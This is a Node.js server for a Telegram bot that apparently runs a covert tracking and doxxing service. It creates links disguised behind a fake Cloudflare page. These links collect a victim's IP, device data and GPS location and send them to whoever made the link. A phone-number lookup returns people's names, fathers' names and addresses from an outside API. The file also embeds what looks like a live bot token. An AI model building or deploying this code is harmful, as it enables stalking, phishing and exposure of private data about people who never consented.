// server.js — v8.0: ADMIN & HELP FIXED + DATA COLLECTION GUARANTEED
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// 🔐 CONFIG
const BOT_TOKEN = "8377073485:AAGEIdG1VgfmrCl4DVN5Qj4gy4oTaN4EvJY";
const ADMIN_CHAT_ID = "8175884349";
const HOST_URL = "https://botu-s3f9.onrender.com";
const BANNED_NUMBERS = ["9161636853", "9451180555", "6306791897"];

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Crash Protection
process.on('unhandledRejection', console.error);
process.on('uncaughtException', console.error);

// Middleware
app.use(require('helmet')());
app.use(require('compression')());
app.use(require('morgan')('dev')); // ← Changed to 'dev' for detailed logs
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.set("view engine", "ejs");

// Sessions
let sessions = {};

// ==================== TELEGRAM BOT — FIXED COMMAND HANDLING ====================

bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = msg.text?.trim();

    // Debug log
    console.log(`📩 Received message from ${chatId}:`, text);

    // Handle URL submission reply
    if (msg?.reply_to_message?.text === "🌐 Send the target URL (http:// or https://)") {
      console.log("🔗 Handling URL submission...");
      return handleUrlSubmission(chatId, text);
    }

    // Handle phone number reply
    if (msg?.reply_to_message?.text === "📱 Send a phone number (e.g., 7800418265)") {
      console.log("📞 Handling number info...");
      return handleNumberInfo(chatId, text);
    }

    // Command Router — NOW WITH DEBUG LOGS
    if (text === "/start") {
      console.log("🚀 /start triggered");
      return sendWelcome(chatId);
    }
    if (text === "/create") {
      console.log("🔗 /create triggered");
      return requestUrl(chatId);
    }
    if (text === "/numberinfo") {
      console.log("📱 /numberinfo triggered");
      return requestPhoneNumber(chatId);
    }
    if (text === "/help") {
      console.log("📘 /help triggered");
      return sendHelp(chatId);
    }
    if (text === "/menu") {
      console.log("🏠 /menu triggered");
      return sendMainMenu(chatId);
    }
    if (text === "/panel") {
      console.log("🔐 /panel triggered by", chatId);
      if (String(chatId) === ADMIN_CHAT_ID) {
        return showAdminPanel(chatId);
      } else {
        bot.sendMessage(chatId, "⛔ Admin access required.");
      }
      return;
    }

    // Default: ignore random messages
    console.log("🗑️ Ignored message:", text);

  } catch (error) {
    console.error("❌ Message handler crashed:", error);
    bot.sendMessage(msg.chat.id, "⚠️ Internal error. Admin notified.");
  }
});

bot.on('callback_query', async (query) => {
  try {
    await bot.answerCallbackQuery(query.id);
    const chatId = query.message.chat.id;
    const data = query.data;

    console.log(`🖱️ Callback from ${chatId}:`, data);

    // Admin actions
    if (data === "admin_sessions") return viewAllSessions(chatId);
    if (data === "admin_stats") return sendStats(chatId);
    if (data === "admin_clear") return clearAllSessions(chatId);

    // User actions
    if (data === "create_new") return requestUrl(chatId);
    if (data === "number_info") return requestPhoneNumber(chatId);
    if (data === "main_menu") return sendMainMenu(chatId);
    if (data === "help_cmd") return sendHelp(chatId);
    if (data === "back_to_panel") return showAdminPanel(chatId);

  } catch (error) {
    console.error("❌ Callback handler crashed:", error);
  }
});

// ==================== NUMBER INFO — USING YOUR API ====================

async function handleNumberInfo(chatId, input) {
  let number = input.replace(/\D/g, '');

  if (BANNED_NUMBERS.includes(number)) {
    return bot.sendMessage(chatId, "❌ This number is restricted.", {
      reply_markup: { inline_keyboard: [[{text:"📱 Try Another",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
    });
  }

  if (!number || number.length < 10) {
    return bot.sendMessage(chatId, "❌ Send 10+ digit number (e.g., 7800418265)", {
      reply_markup: { inline_keyboard: [[{text:"📱 Retry",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
    });
  }

  try {
    const res = await axios.get(`https://demon.taitanx.workers.dev/?mobile=${number}`, { timeout: 8000 });
    const data = res.data;

    if (!data.data?.length) {
      return bot.sendMessage(chatId, "🔍 No data found.", {
        reply_markup: { inline_keyboard: [[{text:"📱 Try Another",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
      });
    }

    let msg = `📞 *RESULTS FOR: \`${number}\`*\n\n`;
    data.data.slice(0,3).forEach(rec => {
      let addr = (rec.address || "").split('!').filter(x=>x).join(', ');
      msg += `👤 *Name:* ${rec.name || 'N/A'}\n`;
      msg += `👨 *Father:* ${rec.fname || 'N/A'}\n`;
      msg += `📬 *Address:* ${addr || 'N/A'}\n`;
      if (rec.alt) msg += `📲 *Alt:* \`${rec.alt}\`\n`;
      msg += `📡 *Circle:* ${rec.circle || 'N/A'}\n---\n\n`;
    });

    bot.sendMessage(chatId, msg, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{text:"📱 New Lookup",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
    });

  } catch (err) {
    console.error("📱 Number API Error:", err.message);
    bot.sendMessage(chatId, "⚠️ Service unavailable. Try again later.", {
      reply_markup: { inline_keyboard: [[{text:"📱 Retry",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
    });
  }
}

function requestPhoneNumber(chatId) {
  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
    reply_markup: { force_reply: true }
  });
}

// ==================== ADMIN PANEL — NOW GUARANTEED TO WORK ====================

function showAdminPanel(chatId) {
  console.log(`🔐 Admin panel opened for ${chatId}`);
  const total = Object.keys(sessions).length;
  const reported = Object.values(sessions).filter(s => s.reported).length;

  bot.sendMessage(chatId, `
🔐 *ADMIN DASHBOARD*

📊 Sessions: ${total}
✅ Reported: ${reported}
⏳ Pending: ${total - reported}
⏱️ Uptime: ${Math.floor(process.uptime())}s

👇 Choose action:
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "👁️ View Sessions", callback_data: "admin_sessions" }],
        [{ text: "📈 Stats", callback_data: "admin_stats" }],
        [{ text: "🗑️ Clear All", callback_data: "admin_clear" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function viewAllSessions(chatId) {
  let list = Object.entries(sessions).slice(0,20);
  let msg = list.length ? "*📋 ACTIVE SESSIONS*\n\n" : "📭 No sessions.\n";

  list.forEach(([id, s], i) => {
    msg += `${i+1}. *${id.substring(0,6)}...*\n`;
    msg += `   👤 User: ${s.chatId}\n`;
    msg += `   ✅ ${s.reported ? 'Delivered' : 'Pending'}\n`;
    msg += `   🌐 ${s.url ? s.url.replace(/^https?:\/\//, '').substring(0,20) + '...' : 'N/A'}\n`;
    msg += `   📍 ${s.location ? 'Got Location' : 'No Location'}\n---\n`;
  });

  bot.sendMessage(chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
  });
}

function sendStats(chatId) {
  const mem = process.memoryUsage();
  bot.sendMessage(chatId, `
📊 *REAL-TIME STATS*

📈 Sessions: ${Object.keys(sessions).length}
MemoryWarning: ${(mem.heapUsed/1024/1024).toFixed(1)} MB
⏱️ Uptime: ${Math.floor(process.uptime())} sec
`, {
    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
  });
}

function clearAllSessions(chatId) {
  const count = Object.keys(sessions).length;
  sessions = {};
  bot.sendMessage(chatId, `✅ Cleared ${count} sessions.`, {
    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
  });
}

// ==================== DATA ENDPOINTS — SIMPLIFIED & LOGGED ====================

app.post("/data", (req, res) => {
  const { uid, data } = req.body;
  console.log("📡 /data hit | UID:", uid); // ← Critical Debug Log

  if (!uid || !data) {
    console.warn("❌ /data missing params");
    return res.status(400).send("Missing uid or data");
  }

  if (!sessions[uid]) {
    sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() };
    console.log("🆕 New session created:", uid);
  }

  sessions[uid].data = decodeURIComponent(data);
  sessions[uid].ip = getIP(req);
  sessions[uid].lastData = new Date();

  console.log("✅ Data saved for session:", uid);
  checkAndDeliver(uid);
  res.send("OK");
});

app.post("/location", (req, res) => {
  const { uid, lat, lon } = req.body;
  console.log("📍 /location hit | UID:", uid, "| Lat:", lat, "| Lon:", lon);

  if (!uid || !lat || !lon) {
    console.warn("❌ /location missing params");
    return res.status(400).send("Missing uid, lat, or lon");
  }

  if (sessions[uid]) {
    sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(req.body.acc || 0) };
    sessions[uid].lastLocation = new Date();
    console.log("✅ Location saved for session:", uid);
    checkAndDeliver(uid);
  }
  res.send("OK");
});

// Delivery — ONLY requires data (location optional now for testing)
function checkAndDeliver(sessionId) {
  const session = sessions[sessionId];
  if (!session || session.reported || !session.data) return; // ← Removed location requirement temporarily for testing

  session.reported = true;
  console.log("📤 Delivering report to user:", session.chatId);

  let cleanData = session.data
    .replaceAll("<br>", "\n")
    .replaceAll("<b>", "*")
    .replaceAll("</b>", "*")
    .replaceAll("<code>", "`")
    .replaceAll("</code>", "`");

  let msg = `
✅ *REPORT DELIVERED*

🆔 Session: \`${sessionId}\`
🌐 URL: ${session.url || 'N/A'}
📡 IP: \`${session.ip || 'Unknown'}\`
🕒 Time: ${new Date().toLocaleTimeString()}

📱 *DEVICE DATA:*
${cleanData}
`;

  if (session.location) {
    msg += `\n\n🗺️ *LOCATION:*\nLat: \`${session.location.lat}\`\nLon: \`${session.location.lon}\`\nAccuracy: \`${session.location.accuracy}m\``;
  } else {
    msg += "\n\n⚠️ *Location: Not captured (testing mode)*";
  }

  bot.sendMessage(session.chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 New Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  }).catch(err => {
    console.error("❌ Failed to send report:", err.message);
  });
}

// ==================== UTILITIES ====================

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '0.0.0.0';
}

function handleUrlSubmission(chatId, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ Must be http:// or https://");
  }

  const sessionId = uuidv4();
  sessions[sessionId] = { chatId, url, createdAt: new Date() };

  const link = `${HOST_URL}/c/${sessionId}/${btoa(encodeURIComponent(url))}`;

  bot.sendMessage(chatId, `
🚀 *LINK READY*

🔗 Target: ${url}
🆔 Session: \`${sessionId}\`

🌐 Send this:
${link}

⏱️ Open on mobile for best results.
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 New Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function requestUrl(chatId) {
  bot.sendMessage(chatId, "🌐 Send URL (http:// or https://)", { reply_markup: { force_reply: true } });
}

// ✅ HELP FIXED — Simple, guaranteed response
function sendHelp(chatId) {
  bot.sendMessage(chatId, `
📘 *HELP MENU*

*TRACKING LINK:*
1. Tap "Create Link"
2. Send any URL
3. Send generated link to target
4. Get full device report

*PHONE LOOKUP:*
Send 10-digit number (e.g., 7800418265)

*COMMANDS:*
/start - Welcome
/create - New link
/numberinfo - Lookup number
/panel - Admin (restricted)
/help - This menu

👨‍💻 @aadi_io
`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function sendMainMenu(chatId) {
  bot.sendMessage(chatId, "🏠 *MAIN MENU*", {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
        [{ text: "📘 Help", callback_data: "help_cmd" }]
      ]
    }
  });
}

function sendWelcome(chatId) {
  bot.sendMessage(chatId, "🎯 *Welcome!* Choose an option below 👇", {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
        [{ text: "📘 Help", callback_data: "help_cmd" }]
      ]
    }
  });
}

// ==================== EXPRESS ROUTES ====================

app.get("/c/:sessionId/:encodedUrl", (req, res) => {
  const { sessionId, encodedUrl } = req.params;
  const url = decodeURIComponent(atob(encodedUrl));

  if (!sessions[sessionId]) {
    sessions[sessionId] = { chatId: null, createdAt: new Date() };
  }
  sessions[sessionId].url = url;

  res.render("cloudflare", {
    ip: getIP(req),
    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
    url: url,
    uid: sessionId,
    a: HOST_URL,
    t: false
  });
});

app.get("/", (req, res) => {
  res.json({ ok: true, version: "8.0-FIXED", sessions: Object.keys(sessions).length });
});

// Cleanup every 20 minutes
setInterval(() => {
  const now = new Date();
  let count = 0;
  for (let id in sessions) {
    if (now - new Date(sessions[id].createdAt) > 1200000) { // 20 min
      delete sessions[id];
      count++;
    }
  }
  if (count > 0) console.log(`🧹 Cleaned ${count} old sessions`);
}, 1200000);

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SERVER v8.0 READY`);
  console.log(`🔗 Port: ${PORT}`);
  console.log(`🌐 Host: ${HOST_URL}`);
  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 12)}...`);
});
